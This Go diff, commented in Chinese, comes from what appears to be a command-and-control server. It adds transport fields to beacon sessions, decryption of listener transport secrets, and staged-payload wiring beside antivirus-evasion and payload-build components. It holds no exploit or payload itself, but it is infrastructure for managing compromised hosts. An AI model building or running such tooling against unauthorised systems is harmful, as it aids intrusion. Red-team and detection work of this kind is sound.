@@ -84,6 +84,7 @@ func c2centerSessionFromDB(m *pgdb.C2Session) *c2center.Session {
 		OS: m.OS, Arch: m.Arch, LocalIPs: m.LocalIPs, PID: m.PID, Process: m.Process,
 		SleepSec: m.SleepSec, JitterPct: m.JitterPct, TaskID: m.TaskID,
 		Status: m.Status, Labels: m.Labels, Meta: m.Meta,
+		Transport: m.Transport, // 方向在 Meta["direction"](§18 正向连接标注)
 		FirstSeen: m.FirstSeen, LastSeen: m.LastSeen,
 	}
 }
@@ -196,11 +197,27 @@ func (p *c2Store) GetListenerKey(id int64) ([]byte, error) {
 	return plain, nil
 }
 
+// GetListenerTransportConfig 解封监听器传输配置(三期 §18,满足 c2center 的
+// transportConfigStore 可选接口):oss 的 endpoint/bucket/AK/SK、kcp 的 psk。
+// 明文 JSON 只进 c2center 运行时内存;未配置返回 (nil, nil)。
+func (p *c2Store) GetListenerTransportConfig(id int64) ([]byte, error) {
+	sealed, err := p.pg.GetC2ListenerTransportConfig(id)
+	if err != nil || sealed == nil {
+		return nil, err
+	}
+	plain, err := p.s.openC2Secret(sealed)
+	if err != nil {
+		return nil, fmt.Errorf("解封监听器 #%d 传输配置失败: %w", id, err)
+	}
+	return plain, nil
+}
+
 func (p *c2Store) UpsertSession(in c2center.SessionInput) (int64, error) {
 	return p.pg.UpsertC2Session(pgdb.C2SessionInput{
 		ListenerID: in.ListenerID, BeaconUID: in.BeaconUID, SID: in.SID,
 		Hostname: in.Hostname, Username: in.Username, Elevated: in.Elevated,
 		OS: in.OS, Arch: in.Arch, LocalIPs: in.LocalIPs, PID: in.PID, Process: in.Process,
+		Transport: in.Transport, Direction: in.Direction,
 	})
 }
 
@@ -476,8 +493,10 @@ func (s *Server) initC2() {
 	log.Printf("[c2-center] C2 中心已启动(监听器/会话/任务/战利品/载荷)")
 
 	// ---- 二期接线(契约 §11)----
-	s.initC2Evasion() // 免杀工作台(Agent B;签名冻结,只此一行调用)
+	s.initC2Evasion() // 免杀工作台(Agent B,c2_evasion.go;签名冻结,只此一行调用)
 	s.initC2Build()   // gosrc 经 VPS 构建 runner(§14,c2_build.go)
+	// 三期 §19 staged 信道接线:c2_payload_api.go 的取 stage 回调(契约 §23 集成项)。
+	mgr.StageDataOpener = s.c2StageDataFor
 }
 
 // ---- vps 载体:入口转发编排(契约 §12) ----
